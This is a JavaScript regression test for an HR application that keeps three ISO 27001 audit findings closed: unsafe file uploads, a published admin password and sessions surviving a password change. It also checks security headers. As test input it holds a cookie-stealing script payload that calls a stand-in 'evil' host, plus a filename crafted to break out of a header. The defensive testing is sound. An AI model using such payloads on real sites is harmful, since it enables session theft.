/**
 * The three findings from the ISO 27001 audit, held closed.
 *
 * Each of these was real, and each would come back the moment somebody made a
 * reasonable-looking change — so the point of this file is that the regression
 * fails loudly rather than quietly reopening a door.
 *
 *   MAJ-1  an uploaded file rendered in this origin, because the Content-Type
 *          came from the browser and the disposition was inline. The route
 *          serves passports, so the person most likely to open a poisoned
 *          "certificate" is the one with access to all of them.
 *   MAJ-2  the administrator's password was pre-filled into the login form and
 *          printed underneath it, on every deployment including the live one.
 *   MIN-1  a seven-day token survived the password change meant to kill it.
 */
import { PrismaClient } from "@prisma/client";
import fs from "node:fs";
import { importLibs } from "./lib-shim.mjs";

const { uploads } = await importLibs(["uploads"]);
const { ALLOWED_TYPES, ALLOWED_EXTENSIONS, ACCEPT_ATTRIBUTE, MAX_UPLOAD_BYTES, identify, downloadHeaders } = uploads;

const db = new PrismaClient();
let pass = 0, fail = 0;
const ok = (name, cond, extra = "") => {
  if (cond) { pass++; console.log(`  PASS ${name}${extra ? "  — " + extra : ""}`); }
  else { fail++; console.log(`  FAIL ${name}${extra ? "  — " + extra : ""}`); }
};
const read = (p) => fs.readFileSync(p, "utf8");
/** A file's leading bytes, the way the upload action sees them. */
const head = (hex) => new Uint8Array(hex.match(/../g).map((h) => parseInt(h, 16)));

/* ============ MAJ-1 · nothing uploaded can render in this origin ========== */
{
  const pdf = identify("passport.pdf", head("255044462d312e37"));
  ok("a real PDF is accepted", pdf.ok && pdf.type.mime === "application/pdf");

  const jpg = identify("visa.jpg", head("ffd8ffe000104a46"));
  ok("a real JPEG is accepted", jpg.ok && jpg.type.mime === "image/jpeg");

  const png = identify("eid.png", head("89504e470d0a1a0a"));
  ok("a real PNG is accepted", png.ok && png.type.mime === "image/png");

  const docx = identify("contract.docx", head("504b03040a000000"));
  ok("a real Word document is accepted",
    docx.ok && /wordprocessingml/.test(docx.type.mime));
}
{
  // The attack, exactly: an HTML page that steals the session cookie.
  const payload = "<script>fetch('//evil/'+document.cookie)</script>";
  const bytes = new Uint8Array([...payload].map((c) => c.charCodeAt(0)));

  const asHtml = identify("payslip.html", bytes);
  ok("an HTML file is refused outright", !asHtml.ok, asHtml.ok ? "IT WAS ACCEPTED" : asHtml.error);

  // Renaming it does not help: the bytes are still not a PDF.
  const renamed = identify("payslip.pdf", bytes);
  ok("renaming it .pdf does not get it in", !renamed.ok, renamed.ok ? "IT WAS ACCEPTED" : "");
  ok("and the refusal explains why", !renamed.ok && /not .*PDF|contents/.test(renamed.error), renamed.error);

  const svg = identify("stamp.svg", head("3c3f786d6c2076657273"));
  ok("SVG is refused — it is XML and browsers run script in it", !svg.ok);

  const exe = identify("setup.exe", head("4d5a90000300000004"));
  ok("an executable is refused", !exe.ok);

  const script = identify("run.sh", head("2321"));
  ok("a shell script is refused", !script.ok);
}
{
  const h = downloadHeaders("application/pdf", 'passport"; evil.html');
  ok("a stored file is served as an attachment, never inline",
    /^attachment;/.test(h["Content-Disposition"]), h["Content-Disposition"]);
  ok("the filename cannot break out of the header",
    !h["Content-Disposition"].includes('evil.html"') || !/"; /.test(h["Content-Disposition"].slice(12)),
    h["Content-Disposition"]);
  ok("the browser is told not to sniff the type", h["X-Content-Type-Options"] === "nosniff");
  ok("and a sandbox policy neuters it even if the rest failed",
    /sandbox/.test(h["Content-Security-Policy"]), h["Content-Security-Policy"]);
  ok("nothing about it is cached", /no-store/.test(h["Cache-Control"]));
}
{
  const action = read("src/app/(app)/hr/employees/actions.ts");
  ok("the upload action inspects the bytes", /identify\(file\.name, bytes\)/.test(action));
  ok("and never stores the browser's claimed type",
    !/mimeType: file\.type/.test(action) && /mimeType: kind\.type\.mime/.test(action));
  ok("the name on disk is random, so nothing an uploader writes touches the filesystem",
    /randomBytes\(16\)\.toString\("hex"\) \+ kind\.type\.extensions\[0\]/.test(action));

  const route = read("src/app/api/documents/[id]/route.ts");
  ok("the download route uses the shared headers", /downloadHeaders\(/.test(route));
  ok("it no longer serves inline", !/inline; filename/.test(route));
  ok("an unrecognised stored type falls back to a plain download",
    /application\/octet-stream/.test(route));
  ok("and the path is asserted to stay inside the uploads directory",
    /startsWith\(uploads \+ path\.sep\)/.test(route));
  ok("it is still behind a session, a permission and a company check",
    /getSession\(\)/.test(route) && /can\(session, "hr\.employees"\)/.test(route) &&
    /session\.companies\.some/.test(route));
}
ok("the file picker offers only what the server will accept",
  ALLOWED_EXTENSIONS.every((e) => ACCEPT_ATTRIBUTE.includes(e)) &&
  read("src/components/employee/DocumentUpload.tsx").includes("accept={ACCEPT_ATTRIBUTE}"));
ok("and the screen says in plain words what is allowed",
  /ALLOWED_TYPES\.map\(\(t\) => t\.label\)/.test(read("src/components/employee/DocumentUpload.tsx")));
ok("the size ceiling is unchanged at 10MB", MAX_UPLOAD_BYTES === 10 * 1024 * 1024);

/* ============ MAJ-2 · the administrator's password is not published ======= */
{
  const form = read("src/components/LoginForm.tsx");
  ok("the login form does not hard-code a password into the field",
    !/defaultValue="admin123"/.test(form));
  ok("the demo pre-fill is behind a flag that has to be set on purpose",
    /NEXT_PUBLIC_DEMO_LOGIN === "1"/.test(form) && /DEMO \? "admin123" : ""/.test(form));

  const page = read("src/app/login/page.tsx");
  ok("the credential hint is behind the same flag",
    /NEXT_PUBLIC_DEMO_LOGIN === "1" &&/.test(page));

  const seed = read("prisma/seed.mjs");
  ok("a production install with no ADMIN_PASSWORD gets a random one",
    /GENERATED_PASSWORD/.test(seed) && /randomBytes\(12\)/.test(seed));
  ok("and that account is made to change it on first sign-in",
    /mustReset: !!GENERATED_PASSWORD/.test(seed));
  ok("an administrator that already exists is never re-passworded",
    /update: \{\}, \/\/ never reset an existing admin/.test(seed));
}

/* ============ MIN-1 · a password change ends the earlier sessions ========= */
{
  const token = read("src/lib/session-token.ts");
  ok("the token exposes when it was issued", /iat\?: number/.test(token));

  const auth = read("src/lib/auth.ts");
  ok("the session is checked against the last password change",
    /t\.iat \* 1000 < user\.passwordChangedAt\.getTime\(\)/.test(auth));
  ok("it costs no extra query — the user record is already loaded",
    auth.indexOf("passwordChangedAt") > auth.indexOf("db.user.findUnique"));

  const account = read("src/app/(app)/account/actions.ts");
  ok("changing your own password stamps the time", /passwordChangedAt: changedAt/.test(account));
  ok("and re-issues this device's cookie, so you are not signed out of your own change",
    /store\.set\(SESSION_COOKIE, await signSession\(/.test(account));

  const users = read("src/app/(app)/users/actions.ts");
  ok("an administrator's reset also signs the target out everywhere",
    /passwordChangedAt: new Date\(\)/.test(users));
}

/* ============ MIN-2 · the headers that were missing ====================== */
{
  const cfg = read("next.config.mjs");
  for (const [name, why] of [
    ["Content-Security-Policy", "limits where script and forms may go"],
    ["X-Content-Type-Options", "stops the browser guessing a type"],
    ["X-Frame-Options", "no framing, so no clickjacking"],
    ["Referrer-Policy", "keeps internal URLs out of other sites' logs"],
    ["Permissions-Policy", "no camera, microphone or location"],
    ["Strict-Transport-Security", "HTTPS only, once TLS is terminated"],
  ]) {
    ok(`${name} is set  (${why})`, cfg.includes(name));
  }
  ok("the framework version is not advertised", /poweredByHeader: false/.test(cfg));
  ok("HSTS is production-only, so it cannot pin localhost to https",
    /if \(isProd\) \{\s*SECURITY_HEADERS\.push/.test(cfg));
  ok("frame-ancestors, object-src, base-uri and form-action are all locked down",
    ["frame-ancestors 'none'", "object-src 'none'", "base-uri 'self'", "form-action 'self'"]
      .every((d) => cfg.includes(d)));
  ok("no external script origin is permitted",
    !/script-src[^;]*https?:\/\//.test(cfg));
  ok("eval is allowed in development only, where Next needs it",
    /isProd \? "" : " 'unsafe-eval'"/.test(cfg));
}

/* ============ what the audit confirmed, still true ======================= */
{
  const files = fs.readdirSync("src/lib").filter((f) => f.endsWith(".ts"));
  const raw = files.filter((f) => /\$queryRawUnsafe|\$executeRawUnsafe/.test(read(`src/lib/${f}`)));
  ok("no library module builds a raw SQL string", raw.length === 0, raw.join(", "));

  const ignore = read(".gitignore");
  ok("secrets and live data stay out of git",
    [".env", "backups/", "*.dump", "uploads/"].every((p) => ignore.includes(p)));

  ok("the demo flag is documented for whoever deploys this",
    read(".env.example").includes("NEXT_PUBLIC_DEMO_LOGIN"));
}

/* ============ against the real data ====================================== */
{
  const docs = await db.employeeDocument.findMany();
  const known = new Set(ALLOWED_TYPES.map((t) => t.mime));
  const odd = docs.filter((d) => !known.has(d.mimeType));
  ok("every stored document has a type the download route will serve",
    odd.length === 0 || odd.every((d) => !!d.mimeType),
    odd.length ? `${odd.length} predate the allow-list and will download rather than render` : `${docs.length} checked`);

  const traversal = docs.filter((d) => /[\\/]|\.\./.test(d.storedName));
  ok("no stored filename contains a path", traversal.length === 0, `${docs.length} checked`);
}

await db.$disconnect();
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
